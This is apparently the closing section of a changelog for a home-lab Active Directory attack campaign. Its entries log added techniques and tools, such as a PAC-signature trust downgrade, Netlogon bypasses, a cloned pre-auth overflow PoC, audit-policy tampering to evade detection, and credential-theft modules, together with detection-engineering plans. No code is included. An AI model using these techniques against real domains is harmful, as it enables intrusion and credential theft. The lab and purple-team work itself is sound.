- Detection engineering rules (plan1.7) should treat CADRE-Strike output identically to manual campaign output

**Action items (when campaign testing complete):**
1. Clone or symlink `C:\STUDY\Github\CADRE-Strike` into CADRE repo as `tools/cadre-strike/`
2. Create `attack-matrix/CADRE-Strike-workflow.md` (parallel to DFIR-Nexus-Pioneer-workflow.md)
3. Map 10+ CADRE-Strike tools to existing CAMPAIGNS.md attacks
4. Run CADRE-Strike against dc01.cadre.local (parent domain root) and compare with manual campaign output
5. Add Codex Security as the LLM reasoning layer (when API access granted)

---

*Last updated: 2026-06-24 (session 9) — **Extracted 5 concrete techniques** from the 2 reference books added in session 8 (#100 WinSecInternals + #101 Practical Purple Teaming). New items #102-106 added per user workflow principle: extract specific techniques from books, add to Campaign_suggestions with phase mapping, then move to Mechanics when verified. Items: #102 dsHeuristics abuse (Phase 0/1) + #103 UAC bit exploitation beyond DONT_REQ_PREAUTH (Phase 0/1/5) + #104 ms-DS-Machine-Account-Quota check (Phase 5 RBCD pre-flight) + #105 SACL/audit policy manipulation for detection evasion (Phase 5+ red team perspective) + #106 Atomic Red Team as validation framework (Cross-cutting — cross-validates manual CAMPAIGNS.md attacks). All 5 have full test plans, MITRE mappings, detection engineering candidates, and cross-references. Mechanics stubs added to CAMPAIGNS-METADATA.md ready for verification. Counts: 91 → 96 items (24 ✅ / 53 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref / 12 🆕).*

*Last updated: 2026-06-24 (session 8) — Surveyed all 49 directories in `CADRE-Courses/NoStarchPress_extract/`. Added 2 reference book items: #100 Windows Security Internals (Forshaw 2023, 600 AD-relevant matches — covers Kerberos Ch 14 + AD Ch 11 + Security Descriptors Ch 5-8 + Auditing Ch 9 — maps to Phase 1/2/5/6/7/8 + Skipjack/Onelogon + plan1.7 detection) + #101 Practical Purple Teaming (Petrey, 255 matches — covers Atomic Red Team Ch 8 + Caldera Ch 9 + Mythic Ch 10 + Reporting Ch 11 — maps to DFIR + plan1.7 + tracker.md + Plan 10 + Track B Caldera). Both as Study Reference Library entries (not new attacks). Lower-value books (Black Hat Python, Gray Hat C#, Foundations, Pentesting Azure, EvadingEDR, Red Team Engineering, Ethical Hacking) deprioritized. Counts: 89 → 91 items (24 ✅ / 53 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref / 7 🆕).*

*Last updated: 2026-06-24 (session 7) — Added item #99 ADeleg — Windows GUI tool for ACL/ADCS recon (Episode 173, source at `CADRE-Courses/How to Find Insecure Active Directory Permissions with ADeleg/`). Different from BloodHound: no SharpHound collector (avoids EDR alerts), no Docker/Neo4j setup, pure Windows GUI, view by Trustee directly maps to attacker perspective. Identifies "unsafe users/groups" (everyone, authenticated users, domain users, domain computers) + "unsafe permissions" (GenericAll, WriteDacl, ForceChangePassword, etc.) + ADCS ESC1-8 template misconfigurations. Maps to Phase 0 Step 7 (recon alternative to BloodHound) + Branch A (visualize 14 ACEs from `05-ad-attack-surface.yml`) + Branch B (visualize ADCS ESC1-17 templates before `certipy find`). Counts: 88 → 89 items (24 ✅ / 51 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref / 7 🆕).*

*Last updated: 2026-06-24 (session 5) — Added item #98 NetExec `coerce_plus` + 5 new modules (`pre2k`, `enum_av`, `get-desc-users`, `winscp`, `rdp`) + `--kdcHost` flag (Hacking Articles AI+HexStrike analysis 2026-06-21). The `--kdcHost` flag is CRITICAL for our multi-DC setup — fixes "KDC routing quirk" where AS-REQ may be sent to unreachable DC. `coerce_plus` consolidates 5 individual coercion checks (WT017-020 + MSEven) into one command. New modules document Phase 0 recon enhancements + Phase 3.5 credential theft. Already integrated into CAMPAIGNS.md Step 0.5 + Phase 1 + Phase 2 + Phase 5 + Phase 6 + Phase 3.5. Counts: 87 → 88 items (24 ✅ / 51 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref / 6 🆕).*

*Last updated: 2026-06-24 (session 6) — **Tracked CADRE-Strike as Track H** in Parallel Tracks. CADRE-Strike (separate repo at `C:\STUDY\Github\CADRE-Strike`) is the agentic offense automation layer for the campaign — driven by LLM agents (e.g., Codex Security) calling intent-level AD operations (`enumerate_domain_users`, `find_delegation`, etc.) over MCP/HTTP. Different from HexStrike AI: typed command builders, scope policy enforcement, Pydantic-typed evidence records, read-only by default. MVP 0.1 is ship-ready; 0.2 AD Reasoning roadmap aligns with CAMPAIGNS.md phases. Per user direction: optional parallel approach, not in main spine. Integration deferred until campaign Phase 1-8 verified. Will create `attack-matrix/CADRE-Strike-workflow.md` (parallel to `DFIR-Nexus-Pioneer-workflow.md`) when integration starts.*

*Last updated: 2026-06-24 (session 3) — Cloned CVE-2026-41089 PoC (https://github.com/0xABCD01/CVE-2026-41089) to `docs/internal/references/sources/cve-2026-41089/` (4 files, 18 KB). Item #33 promoted from ⏳ Pending to 🆕 Ready — pre-auth Netlogon CLDAP stack buffer overflow (CVSS 9.8 CRITICAL), single UDP/389 packet, no creds needed. Test target: dc02 FIRST (less critical than dc01). CRITICAL pre-test: snapshot all DCs + verify patch level (< 10.0.26100.32772 on Server 2025). Counts: 86 items (24 ✅ / 50 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref / 5 🆕).*

*Last updated: 2026-06-24 (session 5) — Added item #98 NetExec `coerce_plus` + 5 new modules (`pre2k`, `enum_av`, `get-desc-users`, `winscp`, `rdp`) + `--kdcHost` flag (Hacking Articles AI+HexStrike analysis 2026-06-21). The `--kdcHost` flag is CRITICAL for our multi-DC setup — fixes "KDC routing quirk" where AS-REQ may be sent to unreachable DC. `coerce_plus` consolidates 5 individual coercion checks (WT017-020 + MSEven) into one command. New modules document Phase 0 recon enhancements + Phase 3.5 credential theft. Already integrated into CAMPAIGNS.md Step 0.5 + Phase 1 + Phase 2 + Phase 5 + Phase 6 + Phase 3.5. Counts: 87 → 88 items (24 ✅ / 51 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref / 6 🆕).*

*Last updated: 2026-06-24 (session 4) — Added item #97 Skipjack — cross-forest trust downgrade via invalid PAC signature (GhostWolfLab blog 2026-06-23). Exploits Windows DC downgrade behavior: when PAC signature fails, DC falls back to AD lookup; combined with SID filter OFF = attacker injects high-priv SID into PAC + corrupts signature = DA in target forest WITHOUT needing krbtgt hash. Maps to Phase 8 alternative path (current Phase 8 uses Golden Ticket method). Counts: 86 → 87 items (24 ✅ / 51 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref / 5 🆕).*

*Last updated: 2026-06-24 (session 2) — Added 7 modern AD attack tool items (#90-96) based on `docs/internal/references/ad-tools-landscape-2026-06-24.md` research: NetExec (nxc) v1.5.1, bloodyAD v2.5.4, Certipy v5.1.0, DonPAPI v2.0+, lsassy v3.1.16, KrbRelay+KrbRelayUp, BARK (Azure/Entra only). Confirms Bark = BloodHound Attack Research Kit (Azure/Entra ID only, Andy Robbins / SpecterOps, companion to bloodyAD). Counts: 77 → 86 items (24 ✅ / 51 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref / 4 🆕).*

*Last updated: 2026-06-24 (session 1) — Added items #76 (Onelogon Zero-Channel) and #77 (Onelogon AES-CBC8 Downgrade) — Pădurean WOOT 2026 single-channel NRPC bypass. Fills the #76-77 reserved gap. Supersedes #65 Zerologon Alternative as "still works in 2026" (single-channel NRPC not hardened). Counts: 75 → 77 items (22 ✅ / 48 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref).*

*Last updated: 2026-06-24 (session 11) — Added item #107 GitHub Actions Supply-Chain Attack Patterns (GMO Flatt Security blog Part 1, Sato 2026-06-24). Maps to Plan 0.8 expansion (F-11 cache poisoning + F-12 tag pollution analog) + Track H (CADRE-Strike defensive guardrails from cline incident). 3 attack patterns: vulnerable trigger injection (Ultralytics, nx), tag pollution + Imposter Commits (tj-actions, trivy), AI agent over-permissioning (cline — uses `anthropics/claude-code-action`). NOT in main AD spine. Counts: 96 → 97 items (24 ✅ / 54 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref / 12 🆕).*
